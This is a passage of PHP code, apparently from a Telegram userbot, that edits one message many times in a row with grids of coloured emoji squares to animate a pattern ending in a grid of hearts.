🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟥🟥🟥🟥🟥🟥🟥🟥🟥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟥🟥🟥🟥🟥🟥🟥🟥🟥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥??🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟪🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟪🟪🟪🟧🟧🟧
🟧🟧🟧🟪🟧🟪🟧🟧🟧
🟧🟧🟧🟪🟪🟪🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟪🟪🟪🟪🟪🟧🟧
🟧🟧🟪🟧🟧🟧🟪🟧🟧
🟧🟧🟪🟧🟦🟧🟪🟧🟧
🟧🟧🟪🟧🟧🟧🟪🟧🟧
🟧🟧🟪🟪🟪🟪🟪🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟪🟪🟪🟪🟪🟪🟪🟧
🟧🟪🟧🟧🟧🟧🟧🟪🟧
🟧🟪🟧🟦🟦🟦🟧🟪🟧
🟧🟪🟧🟦🟧🟦🟧🟪🟧
🟧🟪🟧🟦🟦🟦🟧🟪🟧
🟧🟪🟧🟧🟧🟧🟧🟪🟧
🟧🟪🟪🟪🟪🟪🟪🟪🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟪🟪🟪🟪🟪🟪🟪🟪🟪
🟪🟧🟧🟧🟧🟧🟧🟧🟪
🟪🟧🟦🟦🟦🟦🟦🟧🟪
🟪🟧🟦🟧🟧🟧🟦🟧🟪
🟪🟧🟦🟧⬜️🟧🟦🟧🟪
🟪🟧🟦🟧🟧🟧🟦🟧🟪
🟪🟧🟦🟦🟦🟦🟦🟧🟪
🟪🟧🟧🟧🟧🟧🟧🟧🟪
🟪🟪🟪🟪🟪🟪🟪🟪🟪']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟦🟦🟦🟦🟦🟦🟦🟧
🟧🟦🟧🟧🟧🟧🟧🟦🟧
🟧🟦🟧⬜️⬜️⬜️🟧🟦🟧
🟧🟦🟧⬜️⬜️⬜️🟧🟦🟧
🟧🟦🟧⬜️⬜️⬜️🟧🟦🟧
🟧🟦🟧🟧🟧🟧🟧🟦🟧
🟧🟦🟦🟦🟦🟦🟦🟦🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟦🟦🟦🟦🟦🟦🟦🟦🟦
🟦🟧🟧🟧🟧🟧🟧🟧🟦
🟦🟧⬜️⬜️⬜️⬜️⬜️🟧🟦
🟦🟧⬜️⬜️⬜️⬜️⬜️🟧🟦
🟦🟧⬜️⬜️⬜️⬜️⬜️🟧🟦
🟦🟧⬜️⬜️⬜️⬜️⬜️🟧🟦
🟦🟧⬜️⬜️⬜️⬜️⬜️🟧🟦
🟦🟧🟧🟧🟧🟧🟧🟧🟦
🟦🟦🟦🟦🟦🟦🟦🟦🟦']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧⬜️⬜️⬜️⬜️⬜️⬜️⬜️🟧
🟧⬜️⬜️⬜️⬜️⬜️⬜️⬜️🟧
🟧⬜️⬜️⬜️⬜️⬜️⬜️⬜️🟧
🟧⬜️⬜️⬜️⬜️⬜️⬜️⬜️🟧
🟧⬜️⬜️⬜️⬜️⬜️⬜️⬜️🟧
🟧⬜️⬜️⬜️⬜️⬜️⬜️⬜️🟧
🟧⬜️⬜️⬜️⬜️⬜️⬜️⬜️🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥⬜⬜⬜⬜⬜⬜⬜⬜️🟥
🟥⬜⬜⬜⬜⬜⬜⬜⬜🟥
🟥⬜⬜⬜⬜⬜⬜⬜⬜🟥
🟥⬜⬜⬜⬜⬜⬜⬜⬜🟥
🟥⬜⬜⬜⬜⬜⬜⬜⬜🟥
🟥⬜⬜⬜⬜⬜⬜⬜⬜🟥
🟥⬜⬜⬜⬜⬜⬜⬜⬜🟥
🟥⬜⬜⬜⬜⬜⬜⬜⬜🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥⬜⬜⬜⬜⬜⬜🟥🟥
🟥🟥⬜⬜⬜⬜⬜⬜🟥🟥
🟥🟥⬜⬜⬜⬜⬜⬜🟥🟥
🟥🟥⬜⬜⬜⬜⬜⬜🟥🟥
🟥🟥⬜⬜⬜⬜⬜⬜🟥🟥
🟥🟥⬜⬜⬜⬜⬜⬜🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥⬜⬜⬜⬜️🟥🟥🟥
🟥🟥🟥⬜⬜⬜⬜🟥🟥🟥
🟥🟥🟥⬜⬜⬜⬜🟥🟥🟥
🟥🟥🟥⬜⬜⬜⬜🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥⬜️⬜️🟥🟥🟥🟥
🟥🟥🟥🟥⬜⬜️🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥💙💙🟥🟥🟥🟥
🟥🟥🟥🟥💙💙🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟦🟦🟥🟥🟥🟥
🟥🟥🟥🟥🟦🟦🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟦🟦🟦🟦🟥🟥🟥
🟥🟥🟥🟦🟦🟦🟦🟥🟥🟥
🟥🟥🟥🟦🟦🟦🟦🟥🟥🟥
🟥🟥🟥🟦🟦🟦🟦🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟨🟨🟨🟨🟨🟨🟥🟥
🟥🟥🟨🟦🟦🟦🟦🟨🟥🟥
🟥🟥🟨🟦🟦🟦🟦🟨🟥🟥
🟥🟥🟨🟦🟦🟦🟦🟨🟥🟥
🟥🟥🟨🟦🟦🟦🟦🟨🟥🟥
🟥🟥🟨🟨🟨🟨🟨🟨🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟨🟨🟨🟨🟨🟨🟨🟨🟥
🟥🟨🟨🟨🟨🟨🟨🟨🟨🟥
🟥🟨🟨🟦🟦🟦🟦🟨🟨🟥
🟥🟨🟨🟦🟦🟦🟦🟨🟨🟥
🟥🟨🟨🟦🟦🟦🟦🟨🟨🟥
🟥🟨🟨🟦🟦🟦🟦🟨🟨🟥
🟥🟨🟨🟨🟨🟨🟨🟨🟨🟥
🟥🟨🟨🟨🟨🟨🟨🟨🟨🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟪🟨🟨🟨🟨🟨🟨🟪🟥
🟥🟨🟪🟨🟨🟨🟨🟪🟨🟥
🟥🟨🟨🟦🟦🟦🟦🟨🟨🟥
🟥🟨🟨🟦🟦🟦🟦🟨🟨🟥
🟥🟨🟨🟦🟦🟦🟦🟨🟨🟥
🟥🟨🟨🟦🟦🟦🟦🟨🟨🟥
🟥🟨🟪🟨🟨🟨🟨🟪🟨🟥
🟥🟪🟨🟨🟨🟨🟨🟨🟪🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟪🟨🟨🟨🟨🟨🟨🟪🟥
🟥🟪🟪🟨🟨🟨🟨🟪🟪🟥
🟥🟪🟨🟦🟦🟦🟦🟨🟪🟥
🟥🟪🟨🟦🟦🟦🟦🟨🟪🟥
🟥🟪🟨🟦🟦🟦🟦🟨🟪🟥
🟥🟪🟨🟦🟦🟦🟦🟨🟪🟥
🟥🟪🟪🟨🟨🟨🟨🟪🟪🟥
🟥🟪🟨🟨🟨🟨🟨🟨🟪🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟪🟩🟩🟩🟩🟩🟩🟪🟥
🟥🟪🟪🟨🟨🟨🟨🟪🟪🟥
🟥🟪🟨🟦🟦🟦🟦🟨🟪🟥
🟥🟪🟨🟦🟦🟦🟦🟨🟪🟥
🟥🟪🟨🟦🟦🟦🟦🟨🟪🟥
🟥🟪🟨🟦🟦🟦🟦🟨🟪🟥
🟥🟪🟪🟨🟨🟨🟨🟪🟪🟥
🟥🟪🟩🟩🟩🟩🟩🟩🟪🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟪🟩🟩🟩🟩🟩🟩🟪🟥
🟥🟪🟪⬛️⬛️⬛️⬛️🟪🟪🟥
🟥🟪🟧🟦🟦🟦🟦🟧🟪🟥
🟥🟪🟧🟦🟦🟦🟦🟧🟪🟥
🟥🟪🟧🟦🟦🟦🟦🟧🟪🟥
🟥🟪🟧🟦🟦🟦🟦🟧🟪🟥
🟥🟪🟪⬛️⬛️⬛️⬛️🟪🟪🟥
🟥🟪🟩🟩🟩🟩🟩🟩🟪🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟪🟩🟩🟩🟩🟩🟩🟪🟥
🟥🟪🟪⬛️⬛️⬛️⬛️🟪🟪🟥
🟥🟪🟧🟨🟦🟦🟨🟧🟪🟥
🟥🟪🟧🟦🟨🟨🟦🟧🟪🟥
🟥🟪🟧🟦🟨🟨🟦🟧🟪🟥
🟥🟪🟧🟨🟦🟦🟨🟧🟪🟥
🟥🟪🟪⬛️⬛️⬛️⬛️🟪🟪🟥
🟥🟪🟩🟩🟩🟩🟩🟩🟪🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟪🟩🟩🟩🟩🟩🟩🟪🟥
🟥🟪🟪⬛️⬛️⬛️⬛️🟪🟪🟥
🟥🟪🟧💛🟦🟦💛🟧🟪🟥
🟥🟪🟧🟦💛💛🟦🟧🟪🟥
🟥🟪🟧🟦💛💛🟦🟧🟪🟥
🟥🟪🟧💛🟦🟦💛🟧🟪🟥
🟥🟪🟪⬛️⬛️⬛️⬛️🟪🟪🟥
🟥🟪🟩🟩🟩🟩🟩🟩🟪🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟪🟩🟩🟩🟩🟩🟩🟪🟥
🟥🟪🟪⬛️⬛️⬛️⬛️🟪🟪🟥
🟥🟪🟧💛💙💙💛🟧🟪🟥
🟥🟪🟧💙💛💛💙🟧🟪🟥
🟥🟪🟧💙💛💛💙🟧🟪🟥
🟥🟪🟧💛💙💙💛🟧🟪🟥
🟥🟪🟪⬛️⬛️⬛️⬛️🟪🟪🟥
🟥🟪🟩🟩🟩🟩🟩🟩🟪🟥
??🟥??🟥🟥🟥🟥🟥🟥🟥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟪🟩🟩🟩🟩🟩🟩🟪🟥
🟥🟪🟪🖤🖤🖤🖤🟪🟪🟥
🟥🟪🟧💛💙💙💛🟧🟪🟥
🟥🟪🟧💙💛💛💙🟧🟪🟥
🟥🟪🟧💙💛💛💙🟧🟪🟥
🟥🟪🟧💛💙💙💛🟧🟪🟥
🟥🟪🟪🖤🖤🖤🖤🟪🟪🟥
🟥🟪🟩🟩🟩🟩🟩🟩🟪🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥💜🟩🟩🟩🟩🟩🟩💜🟥
🟥💜💜🖤🖤🖤🖤💜💜🟥
🟥💜🟧💛💙💙💛🟧💜🟥
🟥💜🟧💙💛💛💙🟧💜🟥
🟥💜🟧💙💛💛💙🟧💜🟥
🟥💜🟧💛💙💙💛🟧💜🟥
🟥💜💜🖤🖤🖤🖤💜💜🟥
🟥💜🟩🟩🟩🟩🟩🟩💜🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥💜🟩🟩🟩🟩🟩🟩💜🟥
🟥💜💜🖤🖤🖤🖤💜💜🟥
🟥💜🧡💛💙💙💛🧡💜🟥
🟥💜🧡💙💛💛💙🧡💜🟥
🟥💜🧡💙💛💛💙🧡💜🟥
🟥💜🧡💛💙💙💛🧡💜🟥
🟥💜💜🖤🖤🖤🖤💜💜🟥
🟥💜🟩🟩🟩🟩🟩🟩💜🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥💜💚💚💚💚💚💚💜🟥
🟥💜💜🖤🖤🖤🖤💜💜🟥
🟥💜🧡💛💙💙💛🧡💜🟥
🟥💜🧡💙💛💛💙🧡💜🟥
🟥💜🧡💙💛💛💙🧡💜🟥
🟥💜🧡💛💙💙💛🧡💜🟥
🟥💜💜🖤🖤🖤🖤💜💜🟥
🟥💜💚💚💚💚💚💚💜🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️💜💚💚💚💚💚💚💜❤️
❤️💜💜🖤🖤🖤🖤💜💜❤️
❤️💜🧡💛💙💙💛🧡💜❤️
❤️💜🧡💙💛💛💙🧡💜❤️
❤️💜🧡💙💛💛💙🧡💜❤️
❤️💜🧡💛💙💙💛🧡💜❤️
❤️💜💜🖤🖤🖤🖤💜💜❤️
❤️💜💚💚💚💚💚💚💜❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️']);
